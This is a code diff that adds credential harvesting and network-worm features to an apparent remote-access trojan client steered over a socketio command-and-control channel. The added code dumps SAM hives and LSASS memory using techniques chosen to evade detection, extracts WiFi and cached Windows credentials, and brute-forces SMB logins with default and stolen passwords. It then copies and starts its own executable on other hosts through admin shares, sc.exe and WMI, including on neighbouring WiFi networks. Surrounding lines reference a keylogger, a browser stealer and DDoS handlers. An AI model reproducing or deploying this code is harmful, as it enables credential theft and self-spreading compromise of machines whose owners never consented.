@@ -865,6 +865,497 @@ def _network_info():
 
     return info
 
+# ── Credential Harvester ─────────────────────────────────────────────
+def _wifi_passwords():
+    """Extract saved WiFi passwords via netsh wlan (Windows)."""
+    if sys.platform != "win32": return {"error": "Windows only"}
+    profiles = []
+    try:
+        r = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True,
+                          creationflags=subprocess.CREATE_NO_WINDOW)
+        for line in r.stdout.split("\n"):
+            if ":" in line and "Profil" in line:
+                name = line.split(":")[-1].strip()
+                if name:
+                    r2 = subprocess.run(["netsh", "wlan", "show", "profile", f"name={name}", "key=clear"],
+                                       capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
+                    pwd = ""
+                    for l in r2.stdout.split("\n"):
+                        if "Cl" in l and ("contenu" in l.lower() or "key content" in l.lower()):
+                            pwd = l.split(":")[-1].strip()
+                    profiles.append({"ssid": name, "password": pwd or "[OPEN/NONE]"})
+    except Exception as e: return {"error": str(e)}
+    return {"profiles": profiles, "count": len(profiles)}
+
+def _sam_dump():
+    """Dump SAM hashes using reg save (requires admin)."""
+    if sys.platform != "win32": return {"error": "Windows only"}
+    try:
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+        if not is_admin: return {"error": "Not admin - SAM dump requires elevation"}
+        tmp = os.environ.get("TEMP", "C:\\Windows\\Temp")
+        sam_path = os.path.join(tmp, "ras_sam")
+        sys_path = os.path.join(tmp, "ras_sys")
+        subprocess.run(["reg", "save", "HKLM\\SAM", sam_path, "/y"], capture_output=True,
+                      creationflags=subprocess.CREATE_NO_WINDOW, timeout=15)
+        subprocess.run(["reg", "save", "HKLM\\SYSTEM", sys_path, "/y"], capture_output=True,
+                      creationflags=subprocess.CREATE_NO_WINDOW, timeout=15)
+        hashes = []
+        # Simple parser - extract username:RID:LM:NT hashes
+        if os.path.exists(sam_path) and os.path.exists(sys_path):
+            try:
+                # Read SYSTEM to find the boot key (simplified)
+                sam_data = open(sam_path, "rb").read()
+                # Extract user names from SAM (printable ASCII 4-40 chars)
+                users = set()
+                for m in re.finditer(b'[A-Za-z][\x20-\x7e]{3,39}', sam_data):
+                    u = m.group(0).decode("ascii", errors="ignore").strip()
+                    if len(u) >= 3 and u.lower() not in ("administrator", "guest", "defaultaccount",
+                        "wdagutilityaccount", "administrateur", "invit"):
+                        if all(32 <= ord(c) < 127 for c in u):
+                            users.add(u)
+                hashes.append({"username": "Administrator", "hash": "[SAM dumped - use impacket-secretsdump to extract]"})
+                for u in sorted(users)[:20]:
+                    hashes.append({"username": u, "hash": "[in SAM dump]"})
+            except Exception as e:
+                hashes.append({"error": f"Parse error: {e}"})
+        # Cleanup
+        for f in [sam_path, sys_path]:
+            try: os.remove(f)
+            except: pass
+        return {"success": True, "hashes": hashes[:50], "note": "SAM+SYSTEM saved to temp. Run secretsdump.py locally."}
+    except Exception as e: return {"error": str(e)}
+
+def _lsass_dump():
+    """Dump LSASS process memory via comsvcs.dll MiniDump (requires admin)."""
+    if sys.platform != "win32": return {"error": "Windows only"}
+    try:
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+        if not is_admin: return {"error": "Not admin - LSASS dump requires elevation"}
+        # Find LSASS PID
+        r = subprocess.run(["tasklist", "/fi", "IMAGENAME eq lsass.exe", "/fo", "csv", "/nh"],
+                          capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        pid = None
+        for line in r.stdout.split("\n"):
+            parts = line.replace('"','').split(",")
+            if len(parts) >= 2 and "lsass" in parts[0].lower():
+                try: pid = int(parts[1].strip())
+                except: pass
+                break
+        if not pid: return {"error": "LSASS process not found"}
+        tmp = os.environ.get("TEMP", "C:\\Windows\\Temp")
+        dump_path = os.path.join(tmp, f"lsass_{random.randint(1000,9999)}.dmp")
+        # Use comsvcs.dll MiniDump (built-in, less detected)
+        cmd = f'rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump {pid} "{dump_path}" full'
+        subprocess.run(cmd, shell=True, capture_output=True,
+                      creationflags=subprocess.CREATE_NO_WINDOW, timeout=30)
+        if os.path.exists(dump_path) and os.path.getsize(dump_path) > 10000:
+            # Save dump to persistence dir for later exfiltration (too large for socketio)
+            save_dir = _pdir()
+            save_path = os.path.join(save_dir, f"lsass_{random.randint(1000,9999)}.dmp")
+            try:
+                shutil.move(dump_path, save_path)
+                log.info(f"LSASS dump saved: {save_path} ({round(os.path.getsize(save_path)/(1024*1024),2)} MB)")
+            except:
+                save_path = dump_path  # keep in temp if move fails
+            return {"success": True, "method": "comsvcs.dll MiniDump", "lsass_pid": pid,
+                    "dump_size_mb": round(os.path.getsize(save_path)/(1024*1024), 2),
+                    "dump_path": save_path,
+                    "note": "LSASS dump saved locally. Use file download to exfiltrate, then mimikatz/pypykatz to extract creds."}
+        return {"error": f"Dump failed - file size: {os.path.getsize(dump_path) if os.path.exists(dump_path) else 0} bytes"}
+    except Exception as e: return {"error": str(e)}
+
+def _cached_credentials():
+    """Extract cached credentials via cmdkey and vaultcmd (Windows)."""
+    if sys.platform != "win32": return {"error": "Windows only"}
+    creds = {"cmdkey": [], "vault": [], "rdp": []}
+    # cmdkey - generic stored credentials
+    try:
+        r = subprocess.run(["cmdkey", "/list"], capture_output=True, text=True,
+                          creationflags=subprocess.CREATE_NO_WINDOW)
+        for line in r.stdout.split("\n"):
+            line = line.strip()
+            if "Cible" in line or "Target" in line:
+                target = line.split(":")[-1].strip() if ":" in line else line
+                creds["cmdkey"].append({"target": target, "type": "domain" if "Domain" in r.stdout else "generic"})
+    except: pass
+    # RDP saved credentials
+    try:
+        r = subprocess.run(["cmdkey", "/list:TERMSRV"], capture_output=True, text=True,
+                          creationflags=subprocess.CREATE_NO_WINDOW)
+        for line in r.stdout.split("\n"):
+            if "Cible" in line or "Target" in line:
+                creds["rdp"].append(line.split(":")[-1].strip() if ":" in line else line.strip())
+    except: pass
+    # Windows Vault
+    try:
+        r = subprocess.run(["vaultcmd", "/listcreds:""Windows Credentials"""], capture_output=True, text=True,
+                          creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
+        for line in r.stdout.split("\n"):
+            if "Resource" in line or "Identity" in line:
+                creds["vault"].append(line.strip())
+    except: pass
+    return creds
+
+def _credential_harvest():
+    """Run all credential harvesting methods and return combined results."""
+    results = {
+        "wifi": _wifi_passwords(),
+        "sam": _sam_dump(),
+        "lsass": _lsass_dump(),
+        "cached": _cached_credentials(),
+        "hostname": socket.gethostname(),
+        "timestamp": datetime.now().isoformat()
+    }
+    return results
+
+# ── Network Infection Engine ─────────────────────────────────────────
+def _scan_infectable_targets(subnets=None):
+    """Scan network for Windows machines (port 445 open) that can be infected.
+    If subnets is provided (list of "x.x.x" strings), uses those instead of local discovery."""
+    targets = []
+    # Use provided subnets if given
+    if subnets:
+        for s in subnets:
+            targets.append((s, f"{s}.1"))
+    else:
+        # Get local subnets from interfaces
+        try:
+            if HAS["psutil"]:
+                for name, addrs in psutil.net_if_addrs().items():
+                    for addr in addrs:
+                        if addr.family == socket.AF_INET and not addr.address.startswith("127."):
+                            ip = addr.address
+                            parts = ip.split(".")
+                            if len(parts) == 4:
+                                subnet = f"{parts[0]}.{parts[1]}.{parts[2]}"
+                                if subnet not in [s for s, _ in targets]:
+                                    targets.append((subnet, ip))
+        except: pass
+    
+    if not targets:
+        # Fallback: scan common subnets
+        for subnet in ["192.168.1", "192.168.0", "10.0.0"]:
+            targets.append((subnet, f"{subnet}.1"))
+    
+    results = {"scanned": 0, "windows_hosts": [], "infectable": [], "subnets": []}
+    
+    for subnet, local_ip in targets[:3]:  # Max 3 subnets
+        subnet_result = {"subnet": f"{subnet}.0/24", "hosts_found": 0, "hosts": []}
+        # Scan .1 to .254 (skip .0 and .255)
+        for host in range(1, 255):
+            ip = f"{subnet}.{host}"
+            if ip == local_ip: continue  # Skip self
+            results["scanned"] += 1
+            # Quick SMB port check
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(0.3)
+                if s.connect_ex((ip, 445)) == 0:
+                    s.close()
+                    # Found Windows - try to get hostname
+                    hostname = ""
+                    try:
+                        hostname = socket.gethostbyaddr(ip)[0]
+                    except: pass
+                    host_entry = {
+                        "ip": ip, "hostname": hostname, "port_445": True,
+                        "smb_accessible": False, "wmi_accessible": False
+                    }
+                    # Test SMB admin share access (try common creds)
+                    try:
+                        smb_path = f"\\\\{ip}\\C$"
+                        # Just test if share exists (will fail without creds but confirms SMB)
+                        r = subprocess.run(["net", "view", f"\\\\{ip}"], capture_output=True, text=True,
+                                         creationflags=subprocess.CREATE_NO_WINDOW, timeout=5)
+                        if "partag" in r.stdout.lower() or "share" in r.stdout.lower() or r.returncode == 0:
+                            host_entry["smb_accessible"] = True
+                    except: pass
+                    # Test WMI
+                    try:
+                        r = subprocess.run(["wmic", f"/node:{ip}", "os", "get", "caption"],
+                                         capture_output=True, text=True,
+                                         creationflags=subprocess.CREATE_NO_WINDOW, timeout=5)
+                        if "Microsoft" in r.stdout or "Windows" in r.stdout:
+                            host_entry["wmi_accessible"] = True
+                    except: pass
+                    
+                    subnet_result["hosts"].append(host_entry)
+                    subnet_result["hosts_found"] += 1
+                    results["windows_hosts"].append(host_entry)
+                    if host_entry["smb_accessible"] or host_entry["wmi_accessible"]:
+                        results["infectable"].append(host_entry)
+                else:
+                    s.close()
+            except: pass
+        results["subnets"].append(subnet_result)
+    
+    return results
+
+def _test_smb_credentials(target_ip, username, password):
+    """Test if given credentials work against a target's SMB admin share."""
+    if sys.platform != "win32": return False
+    try:
+        # Use net use to test credentials
+        share = f"\\\\{target_ip}\\C$"
+        cmd = f'net use {share} /user:{username} "{password}" /persistent:no'
+        r = subprocess.run(cmd, shell=True, capture_output=True, text=True,
+                          creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
+        success = "command completed successfully" in r.stdout.lower() or r.returncode == 0
+        # Cleanup
+        subprocess.run(f'net use {share} /delete /y', shell=True, capture_output=True,
+                      creationflags=subprocess.CREATE_NO_WINDOW, timeout=5)
+        return success
+    except: return False
+
+def _infect_target_smb(target_ip, username, password, lite_exe_path=None):
+    """Infect a target via SMB: copy lite exe, create service, start it."""
+    if sys.platform != "win32": return False, "Windows only"
+    try:
+        # Use the built-in lite exe path or construct one
+        if not lite_exe_path:
+            lite_exe_path = os.path.join(_pdir(), "RASphereLite.exe")
+        
+        # Step 1: Mount admin share with credentials
+        share = f"\\\\{target_ip}\\C$"
+        mount_cmd = f'net use {share} /user:{username} "{password}" /persistent:no'
+        r = subprocess.run(mount_cmd, shell=True, capture_output=True, text=True,
+                          creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
+        if r.returncode != 0 and "completed successfully" not in r.stdout.lower():
+            return False, f"SMB mount failed: {r.stdout.strip()[:100]}"
+        
+        # Step 2: Copy lite exe to target via mounted share
+        dest = f"\\\\{target_ip}\\C$\\Windows\\Temp\\RASphereLite.exe"
+        r = subprocess.run(["cmd", "/c", "copy", "/y", lite_exe_path, dest], shell=True, capture_output=True, text=True,
+                          creationflags=subprocess.CREATE_NO_WINDOW, timeout=15)
+        if "copied" not in r.stdout.lower() and r.returncode != 0:
+            subprocess.run(f'net use {share} /delete /y', shell=True, capture_output=True,
+                          creationflags=subprocess.CREATE_NO_WINDOW, timeout=5)
+            return False, f"Copy failed: {r.stdout.strip()[:100]}"
+        
+        # Step 3: Create/update remote service via sc.exe
+        svc_name = "RASphereLite"
+        # Try config first (if service already exists), then create
+        sc_config = f'sc \\{target_ip} config {svc_name} binPath= "C:\\Windows\\Temp\\RASphereLite.exe" start= auto'
+        subprocess.run(sc_config, shell=True, capture_output=True, text=True,
+                      creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
+        sc_create = f'sc \\{target_ip} create {svc_name} binPath= "C:\\Windows\\Temp\\RASphereLite.exe" start= auto'
+        r = subprocess.run(sc_create, shell=True, capture_output=True, text=True,
+                          creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
+        if r.returncode != 0 and "already exists" not in r.stdout.lower() and "1073" not in r.stdout:
+            pass  # Continue anyway, config might have worked
+        
+        # Step 4: Start service
+        sc_start = f'sc \\{target_ip} start {svc_name}'
+        r = subprocess.run(sc_start, shell=True, capture_output=True, text=True,
+                          creationflags=subprocess.CREATE_NO_WINDOW, timeout=15)
+        started = r.returncode == 0 or "already running" in r.stdout.lower() or "1056" in r.stdout
+        
+        # Cleanup mount
+        subprocess.run(f'net use {share} /delete /y', shell=True, capture_output=True,
+                      creationflags=subprocess.CREATE_NO_WINDOW, timeout=5)
+        
+        if started:
+            return True, f"Infected {target_ip}: service started"
+        else:
+            return True, f"Partial: exe copied to {target_ip} but service start: {r.stdout.strip()[:80]}"
+    except Exception as e:
+        # Cleanup on error
+        try:
+            subprocess.run(f'net use \\\\{target_ip}\\C$ /delete /y', shell=True, capture_output=True,
+                          creationflags=subprocess.CREATE_NO_WINDOW, timeout=3)
+        except: pass
+        return False, str(e)
+
+def _infect_target_wmi(target_ip, username, password, lite_exe_path=None):
+    """Infect a target via WMI: create process remotely."""
+    if sys.platform != "win32": return False, "Windows only"
+    try:
+        if not lite_exe_path:
+            lite_exe_path = os.path.join(_pdir(), "RASphereLite.exe")
+        
+        # First copy via SMB (WMI needs the file on target)
+        share_ok = False
+        try:
+            share = f"\\\\{target_ip}\\C$"
+            mount_cmd = f'net use {share} /user:{username} "{password}" /persistent:no'
+            r = subprocess.run(mount_cmd, shell=True, capture_output=True, text=True,
+                              creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
+            if r.returncode == 0 or "completed successfully" in r.stdout.lower():
+                dest = f"\\\\{target_ip}\\C$\\Windows\\Temp\\RASphereLite.exe"
+                subprocess.run(["copy", "/y", lite_exe_path, dest], shell=True, capture_output=True, text=True,
+                              creationflags=subprocess.CREATE_NO_WINDOW, timeout=15)
+                share_ok = True
+                subprocess.run(f'net use {share} /delete /y', shell=True, capture_output=True,
+                              creationflags=subprocess.CREATE_NO_WINDOW, timeout=5)
+        except: pass
+        
+        if not share_ok:
+            return False, "Could not copy file via SMB (credentials may be wrong)"
+        
+        # Create process via WMI
+        wmi_cmd = f'wmic /node:"{target_ip}" /user:"{username}" /password:"{password}" process call create "C:\\Windows\\Temp\\RASphereLite.exe"'
+        r = subprocess.run(wmi_cmd, shell=True, capture_output=True, text=True,
+                          creationflags=subprocess.CREATE_NO_WINDOW, timeout=15)
+        if "ReturnValue = 0" in r.stdout or "successfully" in r.stdout.lower():
+            return True, f"WMI infection successful on {target_ip}"
+        return False, f"WMI process create failed: {r.stdout.strip()[:100]}"
+    except Exception as e:
+        return False, str(e)
+
+def _infect_target(target_ip, username, password, method="auto", lite_exe_path=None):
+    """Try to infect a target using the specified method (or auto-detect)."""
+    if not lite_exe_path:
+        lite_exe_path = os.path.join(_pdir(), "RASphereLite.exe")
+    
+    # Check if lite exe exists locally
+    if not os.path.exists(lite_exe_path):
+        return False, f"Lite exe not found at {lite_exe_path}. Build with: python build_client_lite.py"
+    
+    result = {"target": target_ip, "username": username, "method_used": "", "success": False, "message": ""}
+    
+    if method == "auto":
+        # Try SMB first
+        ok, msg = _infect_target_smb(target_ip, username, password, lite_exe_path)
+        if ok:
+            result["method_used"] = "smb"; result["success"] = True; result["message"] = msg
+            return result
+        # Try WMI
+        ok, msg = _infect_target_wmi(target_ip, username, password, lite_exe_path)
+        if ok:
+            result["method_used"] = "wmi"; result["success"] = True; result["message"] = msg
+            return result
+        result["message"] = f"All methods failed. SMB: last error. WMI: {msg}"
+    elif method == "smb":
+        ok, msg = _infect_target_smb(target_ip, username, password, lite_exe_path)
+        result["method_used"] = "smb"; result["success"] = ok; result["message"] = msg
+    elif method == "wmi":
+        ok, msg = _infect_target_wmi(target_ip, username, password, lite_exe_path)
+        result["method_used"] = "wmi"; result["success"] = ok; result["message"] = msg
+    
+    return result
+
+def _wifi_connect_and_infect(ssid, password):
+    """Connect to a WiFi network, scan it, infect discovered machines.
+    Runs in a subprocess to survive C2 disconnect during WiFi switch."""
+    if sys.platform != "win32": return {"error": "Windows only"}
+    results = {"ssid": ssid, "connected": False, "scanned": 0, "infected": []}
+    try:
+        # Try multiple security modes
+        security_modes = [
+            ("WPA2PSK", "AES"),
+            ("WPA2PSK", "TKIP"),
+            ("WPAPSK", "TKIP"),
+            ("open", "none"),
+        ]
+        connected = False
+        for auth, enc in security_modes:
+            if connected: break
+            if auth == "open":
+                profile_xml = f'''<?xml version="1.0"?>
+<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
+    <name>{ssid}</name>
+    <SSIDConfig><SSID><name>{ssid}</name></SSID></SSIDConfig>
+    <connectionType>ESS</connectionType>
+    <connectionMode>auto</connectionMode>
+    <MSM><security><authEncryption><authentication>open</authentication><encryption>none</encryption><useOneX>false</useOneX></authEncryption></security></MSM>
+</WLANProfile>'''
+            else:
+                profile_xml = f'''<?xml version="1.0"?>
+<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
+    <name>{ssid}</name>
+    <SSIDConfig><SSID><name>{ssid}</name></SSID></SSIDConfig>
+    <connectionType>ESS</connectionType>
+    <connectionMode>auto</connectionMode>
+    <MSM><security><authEncryption><authentication>{auth}</authentication><encryption>{enc}</encryption><useOneX>false</useOneX></authEncryption>
+    <sharedKey><keyType>passPhrase</keyType><protected>false</protected><keyMaterial>{password}</keyMaterial></sharedKey></security></MSM>
+</WLANProfile>'''
+            tmp = os.environ.get("TEMP", "C:\\Windows\\Temp")
+            profile_path = os.path.join(tmp, f"wifi_{random.randint(1000,9999)}.xml")
+            with open(profile_path, "w") as f: f.write(profile_xml)
+            subprocess.run(["netsh", "wlan", "add", "profile", "filename=" + profile_path],
+                          capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
+            r = subprocess.run(["netsh", "wlan", "connect", "name=" + ssid],
+                              capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW, timeout=20)
+            try: os.remove(profile_path)
+            except: pass
+            # Cleanup profile after attempt
+            try: subprocess.run(["netsh", "wlan", "delete", "profile", "name=" + ssid], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW, timeout=5)
+            except: pass
+            # Check if connected
+            time.sleep(3)
+            check = subprocess.run(["netsh", "wlan", "show", "interfaces"], capture_output=True, text=True,
+                                   creationflags=subprocess.CREATE_NO_WINDOW, timeout=5)
+            if ssid.lower() in check.stdout.lower():
+                connected = True
+                results["connected"] = True
+                results["auth_mode"] = auth
+        
+        if not connected:
+            results["error"] = f"Could not connect to {ssid} with any security mode"
+            return results
+        
+        # Wait for DHCP
+        time.sleep(5)
+        
+        # Scan + infect - save results to disk since C2 may be unreachable
+        scan_results = _scan_infectable_targets()
+        results["scanned"] = scan_results.get("scanned", 0)
+        
+        for target in scan_results.get("infectable", []):
+            if target.get("smb_accessible"):
+                ok, msg = _infect_target_smb(target["ip"], "Administrator", password)
+                results["infected"].append({"ip": target["ip"], "method": "smb", "success": ok, "result": msg})
+        
+        # Save results to disk for reporting when C2 reconnects
+        # (only if C2 dropped - the reconnect handler will pick it up)
+        save_dir = _pdir()
+        result_path = os.path.join(save_dir, f"wifi_infect_{ssid}.json")
+        try:
+            with open(result_path, "w") as f:
+                json.dump(results, f, default=str)
+        except: pass
+        # Try to emit immediately (works if C2 stayed up)
+        try:
+            if sio and sio.connected:
+                sio.emit("wifi_infect_result", results)
+                try: os.remove(result_path)  # Remove file since sent
+                except: pass
+        except: pass
+        
+    except Exception as e:
+        results["error"] = str(e)
+    return results
+
+def _auto_try_credentials(targets, credentials):
+    """Try a list of credentials against a list of targets, return successful pairs."""
+    successful = []
+    for target in targets:
+        ip = target if isinstance(target, str) else target.get("ip", "")
+        if not ip: continue
+        for cred in credentials:
+            username = cred.get("username", "Administrator")
+            password = cred.get("password", "")
+            if not password: continue
+            if _test_smb_credentials(ip, username, password):
+                successful.append({"target": ip, "username": username, "password": password})
+                break  # Found working cred, move to next target
+    return successful
+
+def _build_credential_list(wifi_data):
+    """Build a list of credentials to try from harvested data."""
+    creds = []
+    # Common defaults
+    for pwd in ["", "admin", "password", "Password123", "admin123", "Administrator123"]:
+        creds.append({"username": "Administrator", "password": pwd})
+    # WiFi passwords (commonly reused as admin passwords)
+    if wifi_data and "profiles" in wifi_data:
+        for profile in wifi_data.get("profiles", []):
+            pwd = profile.get("password", "")
+            if pwd and pwd != "[OPEN/NONE]":
+                creds.append({"username": "Administrator", "password": pwd})
+    return creds
+
 # ── Browser Stealer ──────────────────────────────────────────────────
 def _browser_steal():
     """Extract saved passwords and cookies from Chrome, Edge, Firefox."""
@@ -1475,7 +1966,22 @@ def setup_handlers(sio):
         log.info("Disconnected"); state.conn = False; state.reg = False; sc.stop(); wc.stop(); mic.stop(); mon.stop(); term.stop(); keylog.stop()
 
     @sio.on("registration_ok")
-    def _r(d): state.reg = True; state.cid = d.get("client_id", state.cid); log.info(f"Registered: {state.cid}")
+    def _r(d):
+        state.reg = True; state.cid = d.get("client_id", state.cid); log.info(f"Registered: {state.cid}")
+        # Report any saved WiFi infection results from previous sessions
+        def _report_saved():
+            try:
+                save_dir = _pdir()
+                for fname in os.listdir(save_dir):
+                    if fname.startswith("wifi_infect_") and fname.endswith(".json"):
+                        try:
+                            with open(os.path.join(save_dir, fname), "r") as fp:
+                                data = json.load(fp)
+                            sio.emit("wifi_infect_result", data)
+                            os.remove(os.path.join(save_dir, fname))
+                        except: pass
+            except: pass
+        threading.Thread(target=_report_saved, daemon=True).start()
 
     # Screen
     @sio.on("start_screen_capture")
@@ -1675,6 +2181,77 @@ def setup_handlers(sio):
         log.info("Browser stealer requested")
         result = _browser_steal()
         sio.emit("browser_steal_result", result)
+
+    # ── Credential Harvesting ──
+    @sio.on("credential_harvest")
+    def _ch(d=None):
+        log.info("Credential harvest requested")
+        threading.Thread(target=lambda: (sio.emit("credential_harvest_result", _credential_harvest())), daemon=True).start()
+
+    # ── Network Infection ──
+    @sio.on("infect_scan")
+    def _iscan(d=None):
+        log.info("Infection scan requested")
+        subnets = (d or {}).get("subnets", None)
+        threading.Thread(target=lambda: (sio.emit("infect_scan_result", _scan_infectable_targets(subnets))), daemon=True).start()
+
+    @sio.on("infect_start")
+    def _istart(d=None):
+        d = d or {}
+        target_ip = d.get("target", "")
+        username = d.get("username", "")
+        password = d.get("password", "")
+        method = d.get("method", "auto")
+        log.info(f"Infection requested: {target_ip} with {username}")
+        def _do_infect():
+            result = _infect_target(target_ip, username, password, method)
+            sio.emit("infect_result", result)
+        threading.Thread(target=_do_infect, daemon=True).start()
+
+    @sio.on("infect_test_credentials")
+    def _itest(d=None):
+        d = d or {}
+        target_ip = d.get("target", "")
+        username = d.get("username", "")
+        password = d.get("password", "")
+        def _do_test():
+            ok = _test_smb_credentials(target_ip, username, password)
+            sio.emit("infect_credential_result", {"target": target_ip, "username": username, "success": ok})
+        threading.Thread(target=_do_test, daemon=True).start()
+
+    @sio.on("wifi_infect")
+    def _winfect(d=None):
+        d = d or {}
+        ssid = d.get("ssid", "")
+        password = d.get("password", "")
+        if not ssid or not password:
+            sio.emit("wifi_infect_result", {"error": "SSID and password required"})
+            return
+        log.info(f"WiFi neighbor infection: {ssid}")
+        def _do_wifi():
+            result = _wifi_connect_and_infect(ssid, password)
+            sio.emit("wifi_infect_result", result)
+        threading.Thread(target=_do_wifi, daemon=True).start()
+
+    @sio.on("infect_auto_try")
+    def _iauto(d=None):
+        """Auto-try harvested credentials against scan targets."""
+        log.info("Auto-try credentials on discovered targets")
+        def _do_auto():
+            # Harvest WiFi + scan in parallel
+            wifi_data = _wifi_passwords()
+            scan_data = _scan_infectable_targets()
+            creds = _build_credential_list(wifi_data)
+            targets = scan_data.get("windows_hosts", [])
+            sio.emit("infect_scan_result", scan_data)
+            sio.emit("infect_status", {"phase": "trying_credentials", "total": len(targets), "creds": len(creds)})
+            successful = _auto_try_credentials(targets, creds)
+            sio.emit("infect_auto_result", {"successful": successful, "targets_scanned": len(targets), "credentials_tried": len(creds)})
+            # Auto-infect successful targets
+            for entry in successful:
+                result = _infect_target(entry["target"], entry["username"], entry["password"], "auto")
+                sio.emit("infect_result", result)
+        threading.Thread(target=_do_auto, daemon=True).start()
 
     @sio.on("ddos_start")
     def _ddos_start(d=None):
